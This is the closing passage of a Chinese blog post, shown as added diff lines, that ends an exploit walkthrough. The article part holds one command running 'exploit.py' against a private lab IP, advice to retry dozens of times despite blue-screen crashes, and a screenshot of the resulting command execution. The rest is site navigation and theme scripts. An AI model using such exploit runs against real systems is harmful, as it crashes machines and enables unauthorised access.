+<p><code>python3 exploit.py -ip 192.168.20.128</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714201462635-2271c3b2-b1bc-418e-a662-e3295185e5e9.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_73,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%233b3c48&clientId=u509d74c4-5306-4&from=paste&height=1126&id=u1ea2313e&originHeight=1408&originWidth=2578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=716400&status=done&style=none&taskId=u6bbf35c6-bc99-4f42-b306-402984e1355&title=&width=2062.4" alt="image.png"><br>如果失败，多试几十次，中间会蓝屏，等各种情况，属于正常行为</p>
+<ol start="5">
+<li>命令执行</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/26698826/1714201613915-b71e5b60-651a-441b-8290-c345c6fdf807.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_73,text_eml5ZWJ1a3U=,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10#averageHue=%233c3c49&clientId=u509d74c4-5306-4&from=paste&height=1126&id=uc27cb56c&originHeight=1408&originWidth=2578&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=720653&status=done&style=none&taskId=u7f2a344e-a799-421f-89b4-dc25d18b732&title=&width=2062.4" alt="image.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+    
+  <nav id="article-nav" class="wow fadeInUp">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://d-sketon.top/img/backimg/bg18.jpg" data-sizes="auto" alt="" class="lazyload">
+          
+        
+        <a href="/2024/07/30/0710%20%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            (no title)
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/bg12.jpg" data-sizes="auto" alt="" class="lazyload">
+        
+      
+      <a href="/2024/07/30/05%20%E7%A4%BE%E5%B7%A5%E5%BA%93/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          (no title)
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+  
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Boy" class="lazyload">
+  <div class="sidebar-author-name">Boy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">23</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+    
+      <div class="sidebar-btn-wrapper" style="position:static">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer" class="wow fadeInUp">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      <div>
+        <span class="icon-copyright"></span>
+        2020-2024
+        <span class="footer-info-sep"></span>
+        Boy
+      </div>
+      
+        <div>
+          基于&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+        </div>
+      
+      
+        <div>
+          <span class="icon-brush"></span>
+          47.1k
+          &nbsp;|&nbsp;
+          <span class="icon-coffee"></span>
+          03:36
+        </div>
+      
+      
+        <div>
+          <span class="icon-eye"></span>
+          <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+          &nbsp;|&nbsp;
+          <span class="icon-user"></span>
+          <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+        </div>
+      
+    </div>
+  </div>
+</footer>
+
+        <div class="sidebar-top">
+          <img src="/images/taichi.png" height="50" width="50" alt="backtop" />
+          <div class="arrow-up"></div>
+        </div>
+        <div id="mask"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Boy" class="lazyload">
+  <div class="sidebar-author-name">Boy</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">23</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">首页</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">归档</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">关于</div>
+    </div>
+  
+    <div class="sidebar-menu-link-wrap">
+      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+      <span class="sidebar-menu-icon"></span>
+      <div class="sidebar-menu-link">友链</div>
+    </div>
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    <div class="site-search">
+      <div class="reimu-popup popup">
+        <div class="reimu-search">
+          <span class="reimu-search-input-icon"></span>
+          <div class="reimu-search-input" id="reimu-search-input"></div>
+        </div>
+        <div class="reimu-results">
+          <div id="reimu-stats"></div>
+          <div id="reimu-hits"></div>
+          <div id="reimu-pagination" class="reimu-pagination"></div>
+        </div>
+        <span class="popup-btn-close"></span>
+      </div>
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+<script type="module" data-pjax>
+  import PhotoSwipeLightbox from "https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.js";
+  
+  const pswp = () => {
+    if (_$$('.article-entry a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-entry',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+      new PhotoSwipeLightbox({
+        gallery: '.article-gallery',
+        children: 'a.article-gallery-item',
+        pswpModule: () => import("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.js")
+      }).init();
+    }
+    window.lightboxStatus = 'done';
+    window.removeEventListener('lightbox:ready', pswp);
+  }
+  if(window.lightboxStatus === 'ready') {
+    pswp()
+  } else {
+    window.addEventListener('lightbox:ready', pswp);
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>
+
+  <script>
+    firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '0.2.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>
+
+
+  <!-- hexo injector body_end start -->
+<script src="/js/insert_highlight.js" data-pjax></script>
+<!-- hexo injector body_end end --></body>
+  </html>
+
